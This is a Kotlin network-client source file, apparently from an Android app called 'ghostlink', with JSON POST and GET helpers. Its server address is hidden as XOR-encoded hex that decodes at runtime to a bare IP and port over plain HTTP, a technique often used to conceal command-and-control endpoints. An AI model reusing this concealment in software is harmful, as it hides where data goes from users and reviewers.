package com.ghostlink.client

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

object NetworkClient {
    private const val ENC = "2f 3c 3b 23 6e 63 66 7f 7e 77 66 7e 6a 61 62 78 7f 7f 69 79 77 66 6e 79 71 7a 7f 74"
    private val BASE: String by lazy { decode(ENC) }
    private fun decode(hex: String): String {
        val key = "GHOSTLINK"
        val bytes = hex.split(" ").map { it.toInt(16) }.toIntArray()
        for (i in bytes.indices) bytes[i] = bytes[i] xor key[i % key.length].code
        return String(bytes.map { it.toChar() }.toCharArray())
    }
    private const val TIMEOUT = 10_000

    suspend fun post(path: String, body: JSONObject): JSONObject = withContext(Dispatchers.IO) {
        val url = URL(BASE + path)
        val conn = (url.openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            setRequestProperty("Content-Type", "application/json")
            setRequestProperty("Connection", "close")
            connectTimeout = 10_000
            readTimeout = 10_000
            doOutput = true
        }
        OutputStreamWriter(conn.outputStream).use { it.write(body.toString()) }

        val response = BufferedReader(InputStreamReader(
            if (conn.responseCode in 200..299) conn.inputStream else conn.errorStream
        )).readText()

        conn.disconnect()
        JSONObject(response)
    }

    suspend fun get(path: String): JSONObject = withContext(Dispatchers.IO) {
        val url = URL(BASE + path)
        val conn = (url.openConnection() as HttpURLConnection).apply {
            requestMethod = "GET"
            connectTimeout = TIMEOUT
            readTimeout = TIMEOUT
        }
        val response = BufferedReader(InputStreamReader(conn.inputStream)).readText()
        conn.disconnect()
        JSONObject(response)
    }
}
